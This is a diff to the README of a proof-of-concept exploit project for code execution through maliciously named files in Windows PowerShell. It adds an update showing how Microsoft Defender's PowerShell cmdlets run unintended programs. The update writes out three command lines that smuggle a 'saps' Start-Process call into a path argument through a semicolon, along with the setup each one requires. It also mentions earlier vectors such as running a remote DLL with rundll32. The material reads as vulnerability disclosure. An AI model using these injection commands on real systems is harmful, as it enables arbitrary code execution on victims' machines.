@@ -2,6 +2,8 @@
 Windows PowerShell Filename Code Execution POC <br>  
 Discovery: John Page (aka hyp3rlinx) 2019 and revisted 2023
 
+Updated: added CL and Windows Defender API vector, see below:
+
 Since it still works, I dusted off and made minor improvements: <br> 
 1) Execute a remote DLL using rundll32
 2) Execute an unintended secondary PS1 script or local text-file (can be hidden)
@@ -85,6 +87,30 @@ c) User must double-click, run from cmd line or drag and drop the maliciously na
 https://www.youtube.com/watch?v=-ZJnA70Cf4I
 
 https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/029d41d2-af58-434d-8d0f-0bf8f01d1c55
+
+Update: Microsoft Defender Anti-Malware PowerShell API - Arbitrary Code Execution.
+
+Microsoft Defender Anti Malware and or PS API's can result in executing arbitrary code.
+E.g. scan a directory, shortcut .lnk or even non-existent item, may execute unintended code.
+This vector builds upon my previous advisory and subsequent project PSTrojanFile.
+
+Requirements:
+1) On CL 'powershell' cmd is prefixed or passed in by calling PowerShell from another script
+2) Executable file of same name as the parameter that lives nearby
+
+Examples:
+powershell Start-MpScan -Scanpath "C:\Users\gg\Downloads\;saps Helper;.1.zip"
+(Helper.exe lives on Desktop)
+
+Create directory  ";saps Test", Test.exe, Test.cmd etc is on same CL path
+powershell Add-MpPreference -ControlledFolderAccessAllowedApplications ";saps Test"
+
+Create directory with semicolon, drop PE file named doom.exe in same path.
+powershell Set-ProcessMitigation -PolicyFilePath  "test;saps doom"
+
+https://www.youtube.com/watch?v=0Go6yJiRWP8
+
+
 
 
 ![PSTrojanFile](https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/31317076-6ceb-4b28-8062-9c8863b0831d)
